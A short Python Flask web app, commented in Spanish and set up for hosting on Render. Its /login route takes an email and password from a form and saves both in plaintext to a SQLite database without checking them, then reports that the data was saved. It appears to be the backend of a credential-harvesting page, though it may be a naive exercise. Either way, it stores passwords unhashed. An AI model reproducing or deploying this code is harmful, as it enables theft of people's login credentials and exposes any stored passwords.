import os
from flask import Flask, render_template, request
import sqlite3

app = Flask(__name__)

# Ruta principal (página de inicio)
@app.route('/')
def index():
    return render_template('index.html')

# Ruta para manejar el formulario de login
@app.route('/login', methods=['POST'])
def login():
    correo = request.form['correo']
    contraseña = request.form['contraseña']

    # Guardar los datos en la base de datos SQLite
    conn = sqlite3.connect('usuarios.db')
    cursor = conn.cursor()
    cursor.execute("INSERT INTO usuarios (correo, contraseña) VALUES (?, ?)", (correo, contraseña))
    conn.commit()
    conn.close()

    return "Datos guardados exitosamente"

if __name__ == '__main__':
    # Adaptar el puerto para Render
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
